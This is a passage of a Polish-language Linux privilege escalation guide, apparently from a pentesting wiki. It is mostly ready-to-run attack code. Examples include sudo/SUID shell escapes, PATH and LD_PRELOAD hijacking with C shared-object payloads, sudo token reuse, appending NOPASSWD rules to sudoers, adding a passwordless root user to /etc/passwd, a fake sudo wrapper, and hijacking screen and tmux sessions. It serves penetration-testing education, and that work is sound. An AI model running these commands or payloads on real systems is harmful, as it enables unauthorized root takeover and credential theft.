(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz przechwycić jakieś credentials.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, którzy **użytkownicy** są w systemie, którzy mogą się **zalogować** i którzy mają **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Niektóre wersje Linuksa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać Ci uprawnienia root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

If you **znasz jakiekolwiek hasło** środowiska **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza ci generowanie dużego hałasu i binarki `su` oraz `timeout` są obecne na komputerze, możesz spróbować przeprowadzić brute-force użytkownika przy użyciu [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` także próbuje przeprowadzić brute-force na użytkownikach.

## Nadużycia zapisywalnego $PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisać do jakiegoś folderu z $PATH** możesz być w stanie eskalować uprawnienia przez **utworzenie backdoora w zapisywalnym folderze** o nazwie jakiegoś polecenia, które zostanie wykonane przez innego użytkownika (najlepiej root) i które **nie jest ładowane z katalogu znajdującego się wcześniej** niż twój zapisywalny folder w $PATH.

### SUDO and SUID

Możesz mieć pozwolenie na uruchomienie pewnego polecenia za pomocą sudo lub polecenia może mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają odczytywać i/lub zapisywać pliki, a nawet wykonać polecenie.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwolić użytkownikowi na uruchomienie pewnego polecenia z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`, więc uzyskanie powłoki jest trywialne — wystarczy dodać klucz ssh do katalogu root lub wywołać `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania polecenia:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **based on HTB machine Admirer**, był **vulnerable** na **PYTHONPATH hijacking**, co pozwalało załadować dowolną bibliotekę python podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV zachowany przez sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać nieinteraktywne zachowanie startowe Basha, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.

- Dlaczego to działa: Dla powłok nieinteraktywnych Bash ocenia `$BASH_ENV` i ładuje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchamianie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowany przez sudo, Twój plik zostanie załadowany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny target, który wywołuje `/bin/bash` w trybie nieinteraktywnym, lub dowolny skrypt bash).
- `BASH_ENV` obecny w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Utwardzanie:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`; użyj `env_reset`.
- Unikaj shell wrappers dla poleceń dozwolonych przez sudo; używaj minimalnych binarek.
- Rozważ logowanie I/O sudo i alertowanie, gdy używane są zachowane zmienne środowiskowe.

### Ścieżki obejścia wykonywania sudo

**Przejdź** aby przeczytać inne pliki lub użyj **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez ścieżki do polecenia

Jeśli **sudo permission** jest przyznane pojedynczemu poleceniu **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Tę technikę można również użyć, jeśli plik **suid** **wykonuje inne polecenie bez określenia jego ścieżki (zawsze sprawdź za pomocą** _**strings**_ **zawartość dziwnego pliku SUID)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary z określoną ścieżką polecenia

Jeśli plik **suid** **wykonuje inne polecenie, podając jego ścieżkę**, możesz spróbować **export a function** o nazwie takiej jak polecenie, które wywołuje plik suid.

Na przykład, jeśli plik suid wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować utworzyć funkcję i ją exportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz binarkę suid, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazywania jednej lub więcej bibliotek współdzielonych (.so), które mają zostać załadowane przez loader przed wszystkimi innymi, włącznie z biblioteką standardową C (`libc.so`). Ten proces nazywa się wstępnym ładowaniem biblioteki.

Jednakże, aby zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku wykonywalnych plików **suid/sgid**, system narzuca pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, w których rzeczywiste ID użytkownika (_ruid_) nie odpowiada efektywnemu ID użytkownika (_euid_).
- Dla plików wykonywalnych z **suid/sgid** wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają **suid/sgid**.

Do eskalacji uprawnień może dojść, jeśli masz możliwość uruchamiania poleceń przy użyciu `sudo` i wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala, aby zmienna środowiskowa **LD_PRELOAD** pozostała i była uwzględniana nawet przy uruchamianiu poleceń z `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec uruchom **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy natrafisz na plik binarny z uprawnieniami **SUID**, który wydaje się nietypowy, warto sprawdzić, czy poprawnie ładuje pliki **.so**. Można to zweryfikować, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjał do wykorzystania.

Aby to wykorzystać, należy stworzyć plik C, np. _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulację uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku shared object (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Wreszcie uruchomienie dotkniętego pliku binarnego SUID powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Skoro znaleźliśmy SUID binary ładujący library z folderu, do którego możemy zapisywać, utwórzmy library w tym folderze o potrzebnej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że wygenerowana biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) jest kuratowaną listą binariów Unix, które mogą zostać wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) jest tym samym, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** w polecenie.

Projekt zbiera legalne funkcje binariów Unix, które można nadużyć, aby wydostać się z ograniczonych shelli, eskalować lub utrzymać podwyższone uprawnienia, przesyłać pliki, uruchamiać bind i reverse shells oraz ułatwiać inne zadania post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli możesz uruchomić `sudo -l` możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **sudo access** ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.

Requirements to escalate privileges:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" używał **`sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie to czas trwania tokena sudo, który pozwala nam używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` jest 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. Możesz jej użyć, aby **aktywować sudo token w swojej sesji** (nie otrzymasz automatycznie root shell, wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) utworzy sh shell w _/tmp_ **należący do root z setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) **utworzy sudoers file**, który sprawi, że **sudo tokens będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **write permissions** w tym folderze lub na którymkolwiek z plików utworzonych wewnątrz folderu, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **create a sudo token for a user and PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **obtain sudo privileges** bez potrzeby znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być czytane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisć** jakikolwiek plik, będziesz w stanie **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli masz możliwość zapisu, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla programu `sudo`, takie jak `doas` w OpenBSD. Pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że a **user usually connects to a machine and uses `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego użytkownika, możesz **create a new sudo executable** który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **modify the $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w .bash_profile), tak aby gdy użytkownik uruchomi sudo, wykonywany był twój sudo executable.

Zwróć uwagę, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Albo uruchamiając coś w stylu:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj plik ten zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że zostaną odczytane pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf`. Te pliki konfiguracyjne **wskazują na inne katalogi**, w których będą **wyszukiwane biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie szukał bibliotek wewnątrz `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma prawa zapisu** w którymkolwiek z wymienionych miejsc: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, w którymkolwiek pliku wewnątrz `/etc/ld.so.conf.d/` lub w którymkolwiek katalogu wskazanym w pliku konfiguracyjnym `/etc/ld.so.conf.d/*.conf`, może to umożliwić eskalację uprawnień.\
Sprawdź **jak wykorzystać tę błędną konfigurację** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/`, program użyje jej w tym miejscu, zgodnie z wartością zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` przy użyciu `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities dostarczają **podzbiór dostępnych uprawnień roota dla procesu**. To efektywnie rozbija uprawnienia roota **na mniejsze i odrębne jednostki**. Każdej z tych jednostek można następnie niezależnie przyznać procesom. W ten sposób pełny zestaw uprawnień jest zredukowany, zmniejszając ryzyko wykorzystania luki.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je nadużywać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

W katalogu, **bit for "execute"** oznacza, że użytkownik może **"cd"** do folderu.\
Bit **"read"** oznacza, że użytkownik może **lista** **plików**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Listy kontroli dostępu (ACLs) stanowią dodatkową warstwę uprawnień dyskrecjonalnych, zdolną **nadpisać tradycyjne uprawnienia ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do pliku lub katalogu poprzez umożliwienie lub odmowę praw konkretnym użytkownikom, którzy nie są właścicielami ani nie należą do grupy. Ten poziom **szczegółowości zapewnia precyzyjniejsze zarządzanie dostępem**. Dalsze szczegóły można znaleźć [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" uprawnienia read i write do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACLs z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte shell sessions

W **starszych wersjach** możesz **hijack** jakąś **shell session** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **połączyć się** tylko do screen sessions należących do **twojego własnego użytkownika**. Jednak możesz znaleźć **interesujące informacje w sesji**.

### screen sessions hijacking

**Wyświetl screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem ze **starymi wersjami tmux**. Nie udało mi się hijackować sesji tmux (v2.1) utworzonej przez root jako nieuprzywilejowany użytkownik.

**Wyświetl sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB** dla przykładu.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, itp.) między wrześniem 2006 a 13 maja 2008 mogą być podatne na ten błąd.\
Błąd ten występuje podczas tworzenia nowego klucza ssh w tych systemach operacyjnych, ponieważ **możliwe były tylko 32,768 warianty**. Oznacza to, że wszystkie możliwości można obliczyć i **mając publiczny klucz ssh możesz wyszukać odpowiadający mu klucz prywatny**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie przy użyciu klucza publicznego jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer zezwala na logowanie do kont z pustymi hasłami. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może logować się przez ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może się zalogować używając hasła i klucza prywatnego
- `without-password` or `prohibit-password`: root może logować się tylko przy użyciu klucza prywatnego
- `forced-commands-only`: Root może logować się tylko używając klucza prywatnego i jeśli opcja commands jest określona
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki bezwzględne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się przy użyciu **private** key użytkownika "**testusername**", ssh porówna public key twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala Ci **use your local SSH keys instead of leaving keys** (bez passphrases!) siedzących na Twoim serwerze. Dzięki temu będziesz mógł **jump** via ssh **to a host** i stamtąd **jump to another** host **using** the **key** located in your **initial host**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` to `*`, za każdym razem gdy użytkownik przełączy się na inną maszynę, ta maszyna będzie miała dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisywać** te **opcje** i pozwalać lub zabraniać tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwalać** lub **zabraniać** ssh-agent forwarding za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie zezwala).

Jeśli odkryjesz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ciekawe pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty, które są wykonywane, gdy użytkownik uruchamia nową powłokę**. Zatem, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakiś dziwny skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Passwd/Shadow Files

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **znaleźć wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **czy w nich są hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach możesz znaleźć **password hashes** w pliku `/etc/passwd` (lub równoważnym).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło jednym z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i ustaw wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Przykład: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Teraz możesz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych linii, aby dodać użytkownika testowego bez hasła.\ UWAGA: możesz obniżyć bieżące bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a także `/etc/shadow` został przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisać do niektórych wrażliwych plików**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat znajdujący się w /etc/systemd/,** wtedy możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany następnym razem, gdy tomcat zostanie uruchomiony.

### Sprawdź katalogi

Następujące katalogi mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Nietypowa lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
